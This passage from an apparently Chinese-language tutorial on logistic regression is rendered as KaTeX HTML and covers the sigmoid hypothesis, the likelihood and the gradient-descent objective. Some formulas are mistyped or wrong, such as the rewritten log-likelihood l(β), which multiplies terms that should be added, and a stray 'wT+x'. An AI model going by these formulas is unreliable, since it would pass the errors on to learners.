style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>}i=1~m，对率回归模型最大化就是要把所有样本概率预测之和最大化，也就是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>l</mi><mo stretchy="false">(</mo><mi>w</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo><mo>=</mo><mo>∑</mo><msup><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></msup><mi>ln</mi><mo>⁡</mo><mi>p</mi><mo stretchy="false">(</mo><msub><mi>y</mi><mi>i</mi></msub><mi mathvariant="normal">∣</mi><msub><mi>x</mi><mi>i</mi></msub><mo separator="true">;</mo><mi>w</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">l(w,b)=\sum{i=1}^m \ln p(y_i|x_i;w,b)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">b</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.00001em;vertical-align:-0.25001em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">1</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.713812em;"><span style="top:-3.11242em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">ln</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">p</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">b</span><span class="mclose">)</span></span></span></span>。为方便讨论，令β=(w;b),x̂ =(x;1),wT+x=βTx̂ ，再令<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>l</mi><mo stretchy="false">(</mo><mi>β</mi><mo stretchy="false">)</mo><mo>=</mo><mo>∑</mo><msup><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></msup><mo>−</mo><msub><mi>y</mi><mi>i</mi></msub><msup><mi>β</mi><mi>T</mi></msup><msub><mi>x</mi><mi>i</mi></msub><mi>ln</mi><mo>⁡</mo><mo stretchy="false">(</mo><mn>1</mn><mo>+</mo><mi>exp</mi><mo>⁡</mo><mrow><msup><mi>β</mi><mi>T</mi></msup><msub><mi>x</mi><mi>i</mi></msub></mrow><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">l(β)=\sum{i=1}^m -y_iβ^Tx_i\ln (1+\exp{β^Tx_i})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.00001em;vertical-align:-0.25001em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">1</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.713812em;"><span style="top:-3.11242em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0913309999999998em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">ln</span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0913309999999998em;vertical-align:-0.25em;"></span><span class="mop">exp</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>这样，最大化原概率和公式等价于最小化。上式为关于β的高阶可导连续凸函数，根据凸优化理论，利用经典的数值优化算法如梯度下降法、牛顿法都可求得最优解。</p></li></ul><h3 id="logistic回归求解"><a class="markdownIt-Anchor" href="#logistic回归求解"></a> logistic回归求解</h3><ul><li>回归的方程表达式为：</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>h</mi><mi>θ</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mi>g</mi><mo stretchy="false">(</mo><msup><mi>θ</mi><mi>T</mi></msup><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mn>1</mn><mrow><mn>1</mn><mo>+</mo><msup><mi>e</mi><mo stretchy="false">(</mo></msup><mo>−</mo><msup><mi>θ</mi><mi>T</mi></msup><mi>x</mi><mo stretchy="false">)</mo></mrow></mfrac></mrow><annotation encoding="application/x-tex">h_θ(x)=g(θ^Tx)=\frac{1}{1+e^(-θ^Tx)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">θ</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1413309999999999em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.2754399999999997em;vertical-align:-0.954em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.2960000000000003em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.814em;"><span style="top:-2.989em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mopen mtight">(</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.767331em;"><span style="top:-2.9890000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord mathdefault">x</span><span class="mclose">)</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.954em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>h</mi><mi>θ</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">h_θ(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">θ</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span></span></span></span>可以进行概率表示：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>y</mi><mo>=</mo><mn>1</mn><mi mathvariant="normal">∣</mi><mi>x</mi><mo separator="true">;</mo><mi>θ</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mi>h</mi><mi>θ</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">P(y=1|x;θ)=h_θ(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord">∣</span><span class="mord mathdefault">x</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">θ</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>y</mi><mo>=</mo><mn>0</mn><mi mathvariant="normal">∣</mi><mi>x</mi><mo separator="true">;</mo><mi>θ</mi><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn><mo>−</mo><msub><mi>h</mi><mi>θ</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">P(y=0|x;θ)=1-h_θ(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mord">∣</span><span class="mord mathdefault">x</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">θ</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span></span></span></span></span></p><ul><li>结合到一起可以写为：</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>y</mi><mi mathvariant="normal">∣</mi><mi>x</mi><mo separator="true">;</mo><mi>θ</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><msub><mi>h</mi><mi>θ</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><msup><mo stretchy="false">)</mo><mi>y</mi></msup><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><msub><mi>h</mi><mi>θ</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><msup><mo stretchy="false">)</mo><mrow><mn>1</mn><mo>−</mo><mi>y</mi></mrow></msup></mrow><annotation encoding="application/x-tex">P(y|x;θ)=(h_θ(x))^y(1-h_θ(x))^{1-y}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord">∣</span><span class="mord mathdefault">x</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">θ</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.714392em;"><span style="top:-3.1130000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">θ</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.1130000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mbin mtight">−</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span></span></span></span></span></span></span></span></span></span></p><ul><li>是不是很巧妙。</li><li>然后找到最大似然估计：</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>l</mi><mi>o</mi><mi>g</mi><mi>L</mi><mo stretchy="false">(</mo><mi>θ</mi><mo stretchy="false">)</mo><mo>=</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><mi>y</mi><mi>log</mi><mo>⁡</mo><mi>h</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>+</mo><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><mi>y</mi><mo stretchy="false">)</mo><mi>log</mi><mo>⁡</mo><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><mi>h</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">log L(θ)=\sum_{i=1}^my\log h(x)+(1-y)\log(1-h(x))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">L</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.929066em;vertical-align:-1.277669em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6513970000000002em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">h</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">h</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mclose">)</span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>J</mi><mo stretchy="false">(</mo><mi>θ</mi><mo stretchy="false">)</mo><mo>=</mo><mo>−</mo><mfrac><mn>1</mn><mrow><mn>2</mn><mi>m</mi></mrow></mfrac><mi>l</mi><mi>o</mi><mi>g</mi><mi>L</mi><mo stretchy="false">(</mo><mi>θ</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">J(θ)=-\frac{1}{2m}log L(θ)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.09618em;">J</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.00744em;vertical-align:-0.686em;"></span><span class="mord">−</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span><span class="mord mathdefault">m</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">L</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mclose">)</span></span></span></span></span></p><ul><li>由于是非线性方程找不到驻点，所以只能用梯度下降法，求导方向下降最大的点移动。</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>h</mi><mi>θ</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mi>θ</mi><mn>1</mn></msub><mi>x</mi><mo>+</mo><msub><mi>θ</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">h_\theta(x)=\theta_1x+\theta_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">θ</span></span></span></span><span 